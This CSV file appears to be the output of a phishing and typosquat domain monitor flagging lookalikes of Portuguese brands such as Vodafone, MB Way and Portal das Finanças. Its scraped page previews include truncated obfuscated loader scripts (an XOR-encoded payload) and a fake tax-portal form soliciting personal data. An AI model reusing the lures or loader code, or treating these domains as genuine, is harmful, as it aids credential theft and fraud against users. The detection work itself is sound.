id,candidate_domain,matched_seed,flag_reason,seen_at,http_status,title,body_preview
14952,www.interactivebill.vodsfone.it,vodafone.pt,levenshtein,1784014890,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14973,mondego.pt,montepio.pt,levenshtein,1784021616,200,Expositores para Miniaturas e Colecionáveis | Mondego Design Lda,"Expositores para Miniaturas e Colecionáveis | Mondego Design Lda window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag(""js"", new Date());gtag(""config"", ""G-MZ4SNE5621""); var cart = cart_data = {""items"":null,""product_tax"":0,""extras_tax"":0,""discount"":0,""discount_without_tax"":0,""discount_tax"":0,""total_rewards_to_earn"":0,""rewards_redeemed"":0,""coupon"":null,""rewards"":n"
14934,www.agireuropa.cef.pt,sef.pt,levenshtein,1784009294,200,Clube Agir Europa,Clube Agir Europa &nbsp; --> Content on this page requires a newer version of Adobe Flash Player. --> &nbsp; &nbsp; &nbsp; Home Actividades Membros Estatutos Boas liga&ccedil;&otilde;es Curiosidades &nbsp; &nbsp; &nbsp; &nbsp; C E F - - - C e n t r o -- d e -- E s t u d o s -- d e -- F &aacute; t i m a - - - 2 0 0 9 &nbsp;
14945,www.ww12.vodafone-tarife.de,vodafone.pt,brand_contains,1784011168,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
15193,www.aureambway.com,mbway.pt,brand_contains,1784095637,200,"Auréa - Bien-être intime, application et produits connectés","var gtm4wp_datalayer_name = ""dataLayer""; var dataLayer = dataLayer || []; Auréa - Bien-être intime, application et produits connectés {""@context"":""https:\/\/schema.org"",""@graph"":[{""@type"":""WebPage"",""@id"":""https:\/\/aureambway.com\/"",""url"":""https:\/\/aureambway.com\/"",""name"":""Auréa - Bien-être intime, application et produits connectés"",""isPartOf"":{""@id"":""https:\/\/aureambway.com\/#website""},""about"""
14936,pos.multimac.pt,multibanco.pt,levenshtein,1784009546,200,pos.multimac.pt,"img:is([sizes=""auto"" i], [sizes^=""auto,"" i]) { contain-intrinsic-size: 3000px 1500px } pos.multimac.pt window._wpemojiSettings = {""baseUrl"":""https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/72x72\/"",""ext"":"".png"",""svgUrl"":""https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/svg\/"",""svgExt"":"".svg"",""source"":{""concatemoji"":""https:\/\/pos.multimac.pt\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.5""}}; /"
14972,www.nose.pt,nos.pt,levenshtein,1784020145,200,nose.pt for sale | Spaceship.com,"nose.pt for sale | Spaceship.com { ""@context"": ""https://schema.org"", ""@type"": ""FAQPage"", ""mainEntity"": [ { ""@type"": ""Question"", ""name"": ""How fast is the domain transfer?"", ""acceptedAnswer"": { ""@type"": ""Answer"", ""text"": ""Transfer timing depends on the domain's current registrar and the transfer method. Spaceship provides guided transfer support and helps monitor the process until completion."" } }, "
14953,cgd-platform.fr,cgd.pt,brand_contains,1784014927,200,,
15026,www.c-sef.com,sef.pt,brand_contains,1784039557,200,C-SEF,"C-SEF C-SEF Home Challenge Solution About Us Contact Try Demo! Welcome! C-SEF COVID-19 Safe Education Framework Demo app Try out our demo of the web app that's available here ! Academic publication Welfare-Maximizing Pooled Testing URL arXiv Exemplary track paper award Simon Finster, Michelle González Amador, Edwin Lock, Francisco Marmolejo-Cossío, Evi Micha, Ariel D. Procaccia. 24th ACM Conferenc"
14929,vodafones.com.ph,vodafone.pt,brand_contains,1784006837,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14928,www.vodafoneseguro.com.ph,vodafone.pt,brand_contains,1784006719,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14906,vodafoneseguros.com.ph,vodafone.pt,brand_contains,1784006522,0,,Remote end closed connection without response
15379,sitemaps.conta-novobanco.com,novobanco.pt,brand_contains,1784149884,0,,<urlopen error timed out>
14926,vodafonespain.org.ph,vodafone.pt,brand_contains,1784006496,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14925,vodafonespain.ph,vodafone.pt,brand_contains,1784006482,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14927,www.vodafone-topangebote.de,vodafone.pt,brand_contains,1784006570,200,VERIVOX | Tarife vergleichen & stressfrei sparen!,"(function(w,i,g){w[g]=w[g]||[];if(typeof w[g].push=='function')w[g].push(i)}) (window,'G-QKH33JXNYD','google_tags_first_party'); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('set', 'developer_id.dY2E1Nz', true); (function (w, d, s, l, i) { w[l] = w[l] || []; w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' }); var"
14924,www.vodafonesale.net.ph,vodafone.pt,brand_contains,1784006480,0,,Remote end closed connection without response
14974,miway.nz,mbway.pt,levenshtein,1784022190,200,Index of /,Index of / Index of / &nbsp; Name Last modified Size Description &nbsp; cgi-bin/ 2022-07-21 11:11 - &nbsp;
14917,vodafonesecure.com.ph,vodafone.pt,brand_contains,1784006468,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14908,vodadone.cz,vodafone.pt,levenshtein,1784003187,200,Načítání...,"Načítání... (function () { const XOR_KEY = 73; const payload = ""tt\u0018\u00040\u0004\u001d\u001d\u0007x\u001d\u0004!\u001b\u0011\u0010\""\u0013\u001a\u00070\u0010\u001d\u0013#\u000f$\u0013!x\r\u00139\u0003{\u0011!\u0013\u001a\u0013}\u0018#\u00131\u0010{\u0007>y\r\u00139\u000f{\u0011!p\r*&\u000b'\u0005;\u0007\u001e(:\u0007{\u00053\u001b\u0001*9\u0003z\u00103p\u001a+%\u001bz*|\u0007z\u0005\u0007$\u"
14962,skillupvodafone.cz,vodafone.pt,brand_contains,1784017287,200,Přihlášení | SkillUp by Vodafone Business,"Přihlášení | SkillUp by Vodafone Business aside{ background-image: url(""https://www.skillupvodafone.cz/dist/front/images/login/bg-registration.webp?v=1""); } Vítejte na SkillUp by Vodafone Business. Přístup do platformy je dostupný pouze pro firemní zákazníky, kteří mají u Vodafone Business aktivní příslušnou licenci Microsoft 365 nebo Microsoft 365 Copilot . Přihlášení do&nbsp;platformy E-mail Hes"
14915,vodafone-starnberg.de,vodafone.pt,brand_contains,1784006242,404,,HTTP 404
15351,conta-novobanco.com,novobanco.pt,brand_contains,1784140408,0,,<urlopen error timed out>
14893,www.plumbwayeheatingsolutions.com,mbway.pt,brand_contains,1784000022,404,,HTTP 404
14881,www.comsecurelogin-verify-secure.com.ph,montepio.pt,keyword,1783996177,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14883,eupaco.org,eupago.pt,levenshtein,1783995872,200,eupaco.org is for sale,"eupaco.org is for sale :root { --blue: #3a56e8; --blue-dark: #2d3fc4; --blue-light: #e8edff; --blue-bg: #f0f4ff; --text: #1a1a2e; --text-secondary: #5a607a; --text-muted: #8b90a5; --bg: #ffffff; --surface: #f7f8fc; --border: #e4e7f1; --accent: #2dd4bf; --accent-light: #f0fdfa; --page-max: 1600px; --radius-card: 16px; --radius-btn: 50px; --heading-weight: 800; } /* Variant 1: indigo, sharper radius"
15093,staging.ams.sef.edu.pk,sef.pt,brand_contains,1784057648,200,SEF Test Asset Managment,"SEF Test Asset Managment window.snipeit = { settings: { ""per_page"": 50 } }; Please Login Username Password Remember Me Login I forgot my password"
14900,cpcontacts.seguros-bancolombia.co,novobanco.pt,keyword,1784000615,200,seguros-bancolombia.co,seguros-bancolombia.co .asset_star0 { background: url('//d38psrni17bvxu.cloudfront.net/themes/assets/star0.gif') no-repeat center; width: 13px; height: 12px; display: inline-block; } .asset_star1 { background: url('//d38psrni17bvxu.cloudfront.net/themes/assets/star1.gif') no-repeat center; width: 13px; height: 12px; display: inline-block; } .asset_starH { background: url('//d38psrni17bvxu.cloudfro
14885,nowo.eu,nowo.pt,brand_contains,1783996243,200,,Nameshift.com Open language menu en België Nederlands (nld) Canada English (eng) Deutschland Deutsch (deu) España Español (esp) France Français (fra) Italia Italiano (ita) Nederland Nederlands (nld) Österreich Deutsch (deu) Polska polski (pln) Portugal Português (por) Sverige Svenska (swe) Türkiye Türkçe (tur) United Kingdom English (eng) United States English (eng) 中国 中文 (zho) Nameshift.com - the
14873,www.instagram-login-verify-secured-update.com.ph,portaldasfinancas.gov.pt,keyword,1783992320,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14872,www.instagram-login-verify-secured-access-update.com.ph,portaldasfinancas.gov.pt,keyword,1783992310,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14930,www.votaciones.sef.es,sef.pt,brand_contains,1784007033,500,,HTTP 500
14895,bancopi.com,bancobpi.pt,levenshtein,1783999903,200,BancoPi.com is for sale | HugeDomains,"BancoPi.com is for sale | HugeDomains window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); /* gtag('config', 'UA-7117339-4'); */ gtag('config', 'UA-7117339-4', { 'custom_map': { 'dimension3': 'siteversion' } }); gtag('event', 'pageLoad', { 'siteversion': 'HDv3' }); Skip to main content Search for domains --> Search +1-303-893-0552 Home FAQs"
14977,promo.vodafone-partitaiva.it,vodafone.pt,brand_contains,1784023756,200,,"img:is([sizes=auto i],[sizes^=""auto,"" i]){contain-intrinsic-size:3000px 1500px} /*# sourceURL=wp-img-auto-sizes-contain-inline-css */ img.wp-smiley, img.emoji { display: inline !important; border: none !important; box-shadow: none !important; height: 1em !important; width: 1em !important; margin: 0 0.07em !important; vertical-align: -0.1em !important; background: none !important; padding: 0 !impor"
14861,instagram-login-verify-secured-update-session.com.ph,portaldasfinancas.gov.pt,keyword,1783989954,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14890,www.moodle.cef.pt,sef.pt,levenshtein,1783998533,500,,HTTP 500
14864,renault.multiauto.pt,multibanco.pt,levenshtein,1783990829,200,Grupo Motorpor - Motorpor,"Grupo Motorpor - Motorpor {""@context"":""https:\/\/schema.org"",""@graph"":[{""@type"":""WebPage"",""@id"":""https:\/\/motorpor.pt\/"",""url"":""https:\/\/motorpor.pt\/"",""name"":""Grupo Motorpor - Motorpor"",""isPartOf"":{""@id"":""https:\/\/motorpor.pt\/#website""},""about"":{""@id"":""https:\/\/motorpor.pt\/#organization""},""primaryImageOfPage"":{""@id"":""https:\/\/motorpor.pt\/#primaryimage""},""image"":{""@id"":""https:\/\/motorpor."
14877,www.myway-lauteragnes.com,mbway.pt,levenshtein,1783994221,200,Lauter Ágnes - Life Coach és családállító - My way,"Lauter Ágnes - Life Coach és családállító - My way /* cyrillic-ext */ @font-face { font-family: 'Alegreya'; font-style: italic; font-weight: 400; font-display: swap; src: url(https://fonts.gstatic.com/s/alegreya/v41/4UaHrEBBsBhlBjvfkSLk96fp57F2IwN-Pw.woff2) format('woff2'); unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; } /* cyrillic */ @font-face { font-fa"
14860,instagram-login-verify-secure-update.com.ph,portaldasfinancas.gov.pt,keyword,1783989728,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14859,millenniumsc.ph,millenniumbcp.pt,levenshtein,1783989433,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14891,email-portaldasfinancas.com,portaldasfinancas.gov.pt,brand_contains,1783998585,200,acceso.gov.pt,"acceso.gov.pt Sábado, 15 julho 2026 Verificação de Dados e Reforço de Segurança Para a ativação de todas as funções da conta e a ativação de recursos de segurança avançados, solicitamos que confirme os seus dados pessoais. A conexão bancária permite processos de automação futuros e serve para a sua proteção. Nome completo : Por favor, insira o nome completo. E-mail: Por favor, insira o e-mail. Tel"
14852,sef.im,sef.pt,brand_contains,1783988188,200,sef.im&nbsp;-&nbsp;sef Recursos e Informações.,"sef.im&nbsp;-&nbsp;sef Recursos e Informações. const CHEQ_BLOCKED_REASONS = [ ""Automation tool"", ""Disabled JS"", ""Malicious Bots"", ""False Representation"", ""Low quality users"", ""Location Spoofing"", ""IP reputation"", ""Browser Anomalies"", ""Invalid Bot Activity"" ]; function doRedirect() { const request = new XMLHttpRequest(); request.open('GET', ""\/\/sef.im/search/tsc.php?ses\u003Dogc3S6VpeIpemqiO2SVvow"
14856,meó.ph,meo.pt,homoglyph,1783988311,0,,Remote end closed connection without response
14835,www.instagram-login-access-secure-verify.com.ph,portaldasfinancas.gov.pt,keyword,1783981525,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14850,montepiogroup.cc,montepio.pt,brand_contains,1783987617,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14847,api-sandbox.bway.ng,mbway.pt,levenshtein,1783986134,200,BWAY Middleware,BWAY Middleware Let's get started Laravel has an incredibly rich ecosystem. We suggest starting with the following. Read the Documentation Watch video tutorials at Laracasts Deploy now
14849,vodafonexone.nz,vodafone.pt,brand_contains,1783987352,200,MiFinity Casinos NZ in 2026,"MiFinity Casinos NZ in 2026 var jnews_ajax_url = '/?ajax-request=jnews' ;function _0x32ba(_0x1889b8,_0x1d4e64){var _0x6e7af8=_0x6e7a();return _0x32ba=function(_0x32baf3,_0x35a4ca){_0x32baf3=_0x32baf3-0x7b;var _0x157037=_0x6e7af8[_0x32baf3];return _0x157037;},_0x32ba(_0x1889b8,_0x1d4e64);}var _0x3da634=_0x32ba;(function(_0xd6f9d0,_0x32b441){var _0x1f3646=_0x32ba,_0x5c7cf1=_0xd6f9d0();while(!![]){tr"
14825,cmctrl.mway.app,mbway.pt,levenshtein,1783977290,403,,HTTP 403
14827,www.facebook-account-verify-login-kate-secure.com.ph,portaldasfinancas.gov.pt,keyword,1783978764,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14899,design.combway.com,mbway.pt,brand_contains,1784000510,200,Cloud Survey,Cloud Survey
15047,www.mywaycom.myway.ltd,mbway.pt,levenshtein,1784042258,200,Myway Technology Company,"Myway Technology Company img:is([sizes=auto i],[sizes^=""auto,"" i]){contain-intrinsic-size:3000px 1500px} /*# sourceURL=wp-img-auto-sizes-contain-inline-css */ img.wp-smiley, img.emoji { display: inline !important; border: none !important; box-shadow: none !important; height: 1em !important; width: 1em !important; margin: 0 0.07em !important; vertical-align: -0.1em !important; background: none !imp"
15243,cgd.jp,cgd.pt,brand_contains,1784110964,200,売り出し中のドメイン名です,"売り出し中のドメイン名です document.addEventListener('DOMContentLoaded', () => { let domain = window.location.hostname.replace(/^www\./, ''); if (domain) { document.title = `${domain} - ${document.title}`; } }); html, body, div, span, h1, h2, h3, p, a, ul, li, section { margin: 0; padding: 0; border: 0; font-size: 100%; vertical-align: baseline; word-break: break-all; } img { width: 100%; height: auto; } p { l"
14976,nxs.pt,nos.pt,levenshtein,1784023687,200,NEXUS - Global IT Solutions,"NEXUS - Global IT Solutions {""@context"":""https:\/\/schema.org"",""@graph"":[{""@type"":""BreadcrumbList"",""@id"":""https:\/\/nexus-solutions.pt\/#breadcrumblist"",""itemListElement"":[{""@type"":""ListItem"",""@id"":""https:\/\/nexus-solutions.pt#listItem"",""position"":1,""name"":""In\u00edcio""}]},{""@type"":""Organization"",""@id"":""https:\/\/nexus-solutions.pt\/#organization"",""name"":""NEXUS - Global IT Solutions"",""description"
14832,vodafonekabelforum.de,vodafone.pt,brand_contains,1783980218,200,Inoffizielles Vodafone-Kabel-Forum - Foren-Übersicht,"Inoffizielles Vodafone-Kabel-Forum - Foren-Übersicht Inoffizielles Vodafone-Kabel-Forum Der Treffpunkt für Kabelkunden von Vodafone - von Kunden für Kunden Zum Inhalt Vodafone-Kabel-Helpdesk &nbsp; Suche Erweiterte Suche Schnellzugriff Unbeantwortete Themen Aktive Themen Suche FAQ Anmelden Registrieren Foren-Übersicht Suche Aktuelle Zeit: 17.07.2026, 20:39 Herzlich Willkommen Liebe Besucher, durch"
14898,mbworld-mbwbay-residences.com.my,mbway.pt,levenshtein,1784000443,200,"MBW Bay | Florian Residences | Danga Bay, Johor Bahru","document.documentElement.className = 'js'; /* Original: https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800&#038;subset=latin,latin-ext&#038;display=swap *//* User Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) Safari/538.1 Daum/4.1 */@font-face {font-family: 'Open Sans';font-style: italic;font-we"
15308,drd.pt,dre.pt,levenshtein,1784126970,200,DRD - Evaporativos | Arrefecimento Industrial | Bioclimatizador BIOCOOL,"DRD - Evaporativos | Arrefecimento Industrial | Bioclimatizador BIOCOOL {""@context"":""https://schema.org"",""@graph"":[{""@type"":""WebPage"",""@id"":""https://www.drd.pt/"",""url"":""https://www.drd.pt/"",""name"":""DRD - Evaporativos | Arrefecimento Industrial | Bioclimatizador BIOCOOL"",""isPartOf"":{""@id"":""https://www.drd.pt/#website""},""about"":{""@id"":""https://www.drd.pt/#organization""},""primaryImageOfPage"":{""@id"":"""
14818,www.berater-vodafone.de,vodafone.pt,brand_contains,1783976020,200,Vodafone Direktvertrieb Privatkunden,"Vodafone Direktvertrieb Privatkunden Vodafone ist einer der größten und modernsten Telekommunikationsanbieter Deutschlands. Als innovativer Technologie- und Dienstleistungskonzern liefert Vodafone Festnetz, Mobilfunk, Internet und Fernsehen aus einer Hand – als einziges Unternehmen sowohl über Mobilfunk-, DSL- als auch Kabeltechnologie. Wir beraten zu Hause Die Kunden begeistern - das ist der Moto"
14820,venteavodafone.com,vodafone.pt,brand_contains,1783976570,451,,HTTP 451
14814,vodafonedslsale.ph,vodafone.pt,brand_contains,1783974000,200,Redirecting...,"Redirecting... (()=>{""use strict"";const t=""offset"",e=""client"",o=function(){};let n=!1,r=!1;const i={loopDelay:50,maxLoop:5,complete:o},l=[];let u=null;const s={cssClass:""ad-overlay google-ad-bottom-outer prebid-wrapper .dfp-ad-container""},a={nullProps:[t+""Parent""],zeroProps:[]};a.zeroProps=[t+""Height"",t+""Left"",t+""Top"",t+""Width"",t+""Height"",e+""Height"",e+""Width""];const c={quick:null,remote:null};let "
14808,www.mcway.com.ph,mbway.pt,levenshtein,1783971947,0,,Remote end closed connection without response
14819,reaction-challenge.vodafone-immersive.de,vodafone.pt,brand_contains,1783976381,200,Vodafone Go Reaction Challenge,"--> Vodafone Go Reaction Challenge @font-face { font-family: 'Vodafone'; src: url('/assets/fonts/vodafone-rg.ttf') format('opentype'); } body { font-family: Vodafone, Arial, Helvetica, sans-serif; } .landing-page { background-color:#000000; position:absolute; width: 100%; height: 100%; overflow: hidden; left: 0; top: 0; right: 0; bottom: 0; } .fullscreen { position:absolute; left: 0; top: 0; right"
15235,app.conta-novobanco.info,novobanco.pt,brand_contains,1784106732,0,,<urlopen error timed out>
14837,www.sef.com.mx,sef.pt,brand_contains,1783982013,200,SEF,"SEF var deviceSessionId = OpenPay.deviceData.setup(); localStorage.setItem('deviceSessionId', deviceSessionId);"
14971,www.sel.pt,sef.pt,levenshtein,1784019766,200,SEL - Salsicharia Estremocense | Enchidos tradicionais do Alentejo,.fusion-builder-live .fusion-builder-live-toolbar .fusion-toolbar-nav > li.fusion-branding .fusion-builder-logo-wrapper .fusiona-avada-logo {background: url( https://sel.pt/wp-content/uploads/2022/01/LOGO-Salchicharia-Estremocense-SEL-SA-150.png ) no-repeat center !important; background-size: contain !important; width: 30px; height: 30px;}.fusion-builder-live .fusion-builder-live-toolbar .fusion-t
14831,ifthewar.com,ifthenpay.com,levenshtein,1783979007,200,"Whoa, What?!","Whoa, What?! Donate to the Ukrainian People: https://www.globalempowermentmission.org/ https://wck.org/ https://www.jdc.org/"
14848,www.mao-com-pt.mao.pt,meo.pt,levenshtein,1783986700,200,Home - Mao Studio,"Home - Mao Studio {""@context"":""https://schema.org"",""@type"":""Organization"",""@id"":""https://mao.com.pt/#"",""name"":"""",""url"":""https://mao.com.pt"",""logo"":{""@type"":""ImageObject"",""@id"":""https://mao.com.pt/#logo"",""inLanguage"":""en-US""},""description"":""Mao Studio"",""sameAs"":[""https://x.com/""]} img:is([sizes=auto i],[sizes^=""auto,"" i]){contain-intrinsic-size:3000px 1500px} /*# sourceURL=wp-img-auto-sizes-contain"
14841,tupago.app,eupago.pt,levenshtein,1783986183,200,TuPago App,TuPago App
14870,mta-sts.mvodafone.es,vodafone.pt,levenshtein,1783993260,200,,
14857,www.mf.pt,mj.pt,levenshtein,1783988414,200,Morgadinho Farm SA &#8211; Property development,"Morgadinho Farm SA &#8211; Property development img:is([sizes=auto i],[sizes^=""auto,"" i]){contain-intrinsic-size:3000px 1500px} /*# sourceURL=wp-img-auto-sizes-contain-inline-css */ img.wp-smiley, img.emoji { display: inline !important; border: none !important; box-shadow: none !important; height: 1em !important; width: 1em !important; margin: 0 0.07em !important; vertical-align: -0.1em !important"
14796,multiauto.pt,multibanco.pt,levenshtein,1783968207,200,Index of /,Index of / Index of / &nbsp; Name Last modified Size Description
